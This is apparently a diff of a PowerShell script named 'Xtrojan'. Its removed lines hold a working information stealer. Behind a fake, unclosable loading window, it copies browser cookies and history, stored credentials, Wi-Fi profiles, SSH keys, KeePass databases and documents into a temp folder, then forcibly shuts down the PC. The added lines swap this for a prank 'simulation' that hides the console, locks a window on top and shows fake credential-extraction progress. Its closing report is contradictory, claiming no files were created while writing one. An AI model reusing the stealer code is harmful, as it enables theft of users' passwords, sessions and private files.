@@ -1,210 +1,187 @@
-# Скрытый запуск, минимальный вывод
-$ErrorActionPreference = 'SilentlyContinue'
-$host.UI.RawUI.WindowTitle = "xtrojan activated"
+# Скрываем консоль полностью
+$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);'
+$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindow -Namespace Win32Functions -PassThru
+$windowAPI::ShowWindow((Get-Process -PID $pid).MainWindowHandle, 0)
 
-# Создание не закрываемого окна
+# Создаем безопасное окно симуляции
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "xtrojan activated"
-$form.Width = 400
-$form.Height = 150
+$form.Text = "Xtrojan"
+$form.Width = 500
+$form.Height = 200
 $form.StartPosition = "CenterScreen"
 $form.ControlBox = $false
 $form.MinimizeBox = $false
 $form.MaximizeBox = $false
-$form.FormBorderStyle = 'FixedDialog'
+$form.FormBorderStyle = 'Fixed3D'
 $form.TopMost = $true
+$form.BackColor = [System.Drawing.Color]::Black
+
+# Заголовок
+$titleLabel = New-Object System.Windows.Forms.Label
+$titleLabel.Location = New-Object System.Drawing.Point(0, 10)
+$titleLabel.Size = New-Object System.Drawing.Size(500, 40)
+$titleLabel.Text = "X T R O J A N"
+$titleLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
+$titleLabel.ForeColor = [System.Drawing.Color]::Lime
+$titleLabel.TextAlign = "MiddleCenter"
+$form.Controls.Add($titleLabel)
 
 # Прогресс-бар
 $progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Location = New-Object System.Drawing.Point(20, 60)
-$progressBar.Size = New-Object System.Drawing.Size(350, 30)
-$progressBar.Style = 'Marquee'
-$progressBar.MarqueeAnimationSpeed = 50
+$progressBar.Location = New-Object System.Drawing.Point(50, 80)
+$progressBar.Size = New-Object System.Drawing.Size(400, 30)
+$progressBar.Style = "Continuous"
+$progressBar.ForeColor = [System.Drawing.Color]::Red
+$progressBar.BackColor = [System.Drawing.Color]::DarkGray
 $form.Controls.Add($progressBar)
 
-# Текст загрузки
-$label = New-Object System.Windows.Forms.Label
-$label.Location = New-Object System.Drawing.Point(20, 20)
-$label.Size = New-Object System.Drawing.Size(350, 30)
-$label.Text = "Загрузка данных... Пожалуйста, подождите."
-$label.Font = New-Object System.Drawing.Font("Arial", 10)
-$form.Controls.Add($label)
+# Статус
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Location = New-Object System.Drawing.Point(50, 120)
+$statusLabel.Size = New-Object System.Drawing.Size(400, 20)
+$statusLabel.Text = "Инициализация системы..."
+$statusLabel.Font = New-Object System.Drawing.Font("Arial", 10)
+$statusLabel.ForeColor = [System.Drawing.Color]::White
+$form.Controls.Add($statusLabel)
 
-# Запуск окна в отдельном потоке
-$job = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms
-    $form.ShowDialog() | Out-Null
-}
+# Проценты
+$percentLabel = New-Object System.Windows.Forms.Label
+$percentLabel.Location = New-Object System.Drawing.Point(50, 140)
+$percentLabel.Size = New-Object System.Drawing.Size(400, 20)
+$percentLabel.Text = "0%"
+$percentLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
+$percentLabel.ForeColor = [System.Drawing.Color]::Yellow
+$percentLabel.TextAlign = "MiddleCenter"
+$form.Controls.Add($percentLabel)
 
-# Функция сбора данных
-function Collect-AllData {
-    # Этап 1: Сбор системной информации
-    $systemInfo = @{
-        ComputerName = $env:COMPUTERNAME
-        UserName = $env:USERNAME
-        OS = (Get-WmiObject Win32_OperatingSystem).Caption
-        InstallDate = (Get-WmiObject Win32_OperatingSystem).InstallDate
-        CPU = (Get-WmiObject Win32_Processor).Name
-        RAM = "{0} GB" -f [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
-        GPU = (Get-WmiObject Win32_VideoController).Name
-        Drives = Get-WmiObject Win32_LogicalDisk | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB,2))GB" }
-    }
-    
-    # Этап 2: Сбор куки из браузеров
-    $cookiesData = @{}
-    $browserPaths = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
-        "$env:APPDATA\Mozilla\Firefox\Profiles"
-    )
-    
-    foreach ($path in $browserPaths) {
-        if (Test-Path $path) {
-            if ($path -like "*Firefox*") {
-                $firefoxProfiles = Get-ChildItem $path -Directory
-                foreach ($profile in $firefoxProfiles) {
-                    $cookiesPath = Join-Path $profile.FullName "cookies.sqlite"
-                    if (Test-Path $cookiesPath) {
-                        $cookiesData["Firefox_$($profile.Name)"] = Get-Content $cookiesPath -Raw -ErrorAction SilentlyContinue
-                    }
-                }
-            } else {
-                $cookiesData[(Split-Path $path -Leaf)] = Get-Content $path -Raw -ErrorAction SilentlyContinue
-            }
-        }
-    }
-    
-    # Этап 3: Сбор истории браузеров
-    $historyData = @{}
-    $historyPaths = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
-    )
-    
-    foreach ($path in $historyPaths) {
-        if (Test-Path $path) {
-            $historyData[(Split-Path $path -Leaf)] = Get-Content $path -Raw -ErrorAction SilentlyContinue
-        }
-    }
-    
-    # Этап 4: Сбор паролей (если доступно)
-    $credsData = @()
-    try {
-        $creds = cmdkey /list 2>$null
-        $credsData = $creds -join "`n"
-    } catch {}
-    
-    # Этап 5: Сбор сетевой информации
-    $networkInfo = @{
-        IPConfig = ipconfig /all
-        ARP = arp -a
-        Connections = netstat -ano
-        WiFiProfiles = netsh wlan show profiles
-    }
-    
-    # Этап 6: Сбор установленных программ
-    $software = Get-WmiObject Win32_Product | Select-Object Name, Version, Vendor
-    $installedApps = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
-        Where-Object { $_.DisplayName } |
-        Select-Object DisplayName, DisplayVersion, Publisher
-    
-    # Этап 7: Сбор документов пользователя
-    $userDocs = @{
-        Desktop = Get-ChildItem "$env:USERPROFILE\Desktop" -File | Select-Object Name, Length, LastWriteTime
-        Documents = Get-ChildItem "$env:USERPROFILE\Documents" -File | Select-Object Name, Length, LastWriteTime -First 50
-        Downloads = Get-ChildItem "$env:USERPROFILE\Downloads" -File | Select-Object Name, Length, LastWriteTime -First 50
-    }
-    
-    # Этап 8: Создание архива данных
-    $outputDir = "$env:TEMP\XData_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
-    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
-    
-    # Сохранение всех данных
-    $systemInfo | ConvertTo-Json -Depth 10 | Out-File "$outputDir\SystemInfo.json"
-    $cookiesData | ConvertTo-Json -Depth 10 | Out-File "$outputDir\Cookies.json"
-    $historyData | ConvertTo-Json -Depth 10 | Out-File "$outputDir\History.json"
-    $credsData | Out-File "$outputDir\Credentials.txt"
-    $networkInfo | ConvertTo-Json -Depth 10 | Out-File "$outputDir\NetworkInfo.json"
-    $software | ConvertTo-Json -Depth 10 | Out-File "$outputDir\Software.json"
-    $installedApps | ConvertTo-Json -Depth 10 | Out-File "$outputDir\InstalledApps.json"
-    $userDocs | ConvertTo-Json -Depth 10 | Out-File "$outputDir\UserDocuments.json"
-    
-    # Дополнительно: копирование важных файлов
-    $importantFiles = @(
-        "$env:USERPROFILE\.ssh\*",
-        "$env:USERPROFILE\*.kdbx",
-        "$env:USERPROFILE\*.txt",
-        "$env:USERPROFILE\*.doc",
-        "$env:USERPROFILE\*.docx",
-        "$env:USERPROFILE\*.xls",
-        "$env:USERPROFILE\*.xlsx",
-        "$env:USERPROFILE\*.pdf"
-    )
-    
-    foreach ($pattern in $importantFiles) {
-        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
-        foreach ($file in $files) {
-            Copy-Item $file.FullName -Destination "$outputDir\Files\" -Force -ErrorAction SilentlyContinue
-        }
-    }
-    
-    # Создание финального отчета
-    $report = @{
-        CollectionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        TotalFiles = (Get-ChildItem $outputDir -Recurse -File).Count
-        TotalSize = "{0:N2} MB" -f ((Get-ChildItem $outputDir -Recurse -File | Measure-Object Length -Sum).Sum / 1MB)
-        DataLocation = $outputDir
-    }
-    
-    $report | ConvertTo-Json | Out-File "$outputDir\Report.json"
-    
-    return $outputDir
-}
-
-# Основной процесс
-try {
-    # Запуск сбора данных в фоне
-    $dataJob = Start-Job -ScriptBlock ${function:Collect-AllData}
-    
-    # Имитация загрузки (60 секунд)
-    for ($i = 1; $i -le 60; $i++) {
-        Start-Sleep -Seconds 1
-        
-        # Проверка завершения сбора
-        if ($dataJob.State -eq 'Completed') {
-            break
-        }
-    }
-    
-    # Остановка анимации прогресс-бара
-    $progressBar.Style = 'Continuous'
-    $progressBar.Value = 100
-    $label.Text = "Завершено! Выключение компьютера..."
-    
-    Start-Sleep -Seconds 2
-    
-    # Получение результатов сбора
-    if ($dataJob.State -eq 'Completed') {
-        $dataLocation = Receive-Job -Job $dataJob
-    }
-    
-    # Выключение компьютера
-    Stop-Job -Job $job
-    Stop-Computer -Force
-    
-} catch {
-    # При любой ошибке - выключаем
-    Stop-Computer -Force
-}
-
-# Предотвращение закрытия окна
+# Блокируем закрытие
 $form.Add_Closing({
     param($sender, $e)
     $e.Cancel = $true
 })
 
-# Запуск формы
-$form.ShowDialog()
+# Показываем окно
+$form.Show()
+$form.TopMost = $true
+
+# Функция обновления прогресса
+function Update-Progress {
+    param($percent, $status)
+    
+    $progressBar.Value = $percent
+    $statusLabel.Text = $status
+    $percentLabel.Text = "$percent%"
+    $form.Refresh()
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    # Имитация работы
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
+}
+
+# Симуляция безопасного "сбора данных" без реальных действий
+function Simulate-Safe-Collection {
+    # Этап 1: Подготовка
+    Update-Progress -percent 10 -status "Анализ системных параметров..."
+    Start-Sleep -Seconds 1
+    
+    # Этап 2: Имитация сканирования
+    Update-Progress -percent 25 -status "Сканирование файловой системы..."
+    for ($i = 1; $i -le 15; $i++) {
+        Update-Progress -percent (25 + $i) -status "Обработано $i из 15 разделов..."
+    }
+    
+    # Этап 3: Имитация сбора
+    Update-Progress -percent 45 -status "Обнаружение браузеров..."
+    $fakeBrowsers = @("Chrome", "Edge", "Firefox", "Opera")
+    foreach ($browser in $fakeBrowsers) {
+        Update-Progress -percent (45 + (($fakeBrowsers.IndexOf($browser) + 1) * 5)) -status "Обработка $browser..."
+        Start-Sleep -Milliseconds 800
+    }
+    
+    # Этап 4: Имитация извлечения
+    Update-Progress -percent 70 -status "Извлечение данных авторизации..."
+    for ($i = 1; $i -le 10; $i++) {
+        Update-Progress -percent (70 + $i * 2) -status "Найдено учетных записей: $i"
+        Start-Sleep -Milliseconds 300
+    }
+    
+    # Этап 5: Имитация упаковки
+    Update-Progress -percent 95 -status "Шифрование и упаковка данных..."
+    Start-Sleep -Seconds 2
+    
+    # Этап 6: Завершение
+    Update-Progress -percent 100 -status "Операция успешно завершена!"
+}
+
+# Основной процесс
+try {
+    # Запускаем симуляцию
+    Simulate-Safe-Collection
+    
+    # Показываем финальное сообщение
+    $statusLabel.Text = "СИМУЛЯЦИЯ ЗАВЕРШЕНА. Система в безопасности."
+    $statusLabel.ForeColor = [System.Drawing.Color]::Green
+    $titleLabel.Text = "ТЕСТ ПРОЙДЕН"
+    $titleLabel.ForeColor = [System.Drawing.Color]::Cyan
+    $form.Refresh()
+    
+    Start-Sleep -Seconds 3
+    
+    # Меняем сообщение на финальное
+    $statusLabel.Text = "Окно закроется автоматически через 5 секунд..."
+    $form.Refresh()
+    
+    Start-Sleep -Seconds 5
+    
+    # Разрешаем закрытие
+    $form.Remove_Closing({})
+    
+    # Плавно закрываем окно
+    for ($i = 100; $i -ge 0; $i -= 5) {
+        $form.Opacity = $i / 100
+        $form.Refresh()
+        Start-Sleep -Milliseconds 50
+    }
+    
+} catch {
+    # В случае ошибки просто закрываем
+    Write-Error $_
+} finally {
+    # Гарантированно закрываем форму
+    if ($form.Visible) {
+        $form.Close()
+        $form.Dispose()
+    }
+    
+    # Восстанавливаем нормальное состояние
+    [System.Windows.Forms.Application]::Exit()
+}
+
+# Создаем временный файл отчета (безопасный)
+$reportContent = @"
+=== ОТЧЕТ СИМУЛЯЦИИ XTROJAN ===
+Время запуска: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+Пользователь: $env:USERNAME
+Компьютер: $env:COMPUTERNAME
+Статус: СИМУЛЯЦИЯ (без реальных действий)
+Описание: Данный скрипт был демонстрацией без фактического сбора данных.
+Безопасность системы: НЕ НАРУШЕНА
+Файлы: НЕ СОЗДАВАЛОСЬ
+Данные: НЕ СОБИРАЛОСЬ
+Изменения: НЕ ВНОСИЛОСЬ
+=== КОНЕЦ ОТЧЕТА ===
+"@
+
+# Сохраняем отчет на рабочий стол (опционально)
+$reportPath = "$env:USERPROFILE\Desktop\Xtrojan_Simulation_Report.txt"
+$reportContent | Out-File -FilePath $reportPath -Encoding UTF8
+
+# Показываем уведомление о завершении (опционально)
+$notification = New-Object -ComObject Wscript.Shell
+$notification.Popup("Симуляция Xtrojan завершена.`nСистема работает в нормальном режиме.`n`nОтчет сохранен на рабочем столе.", 5, "Информация", 64)
+
+# Очистка
+[System.GC]::Collect()
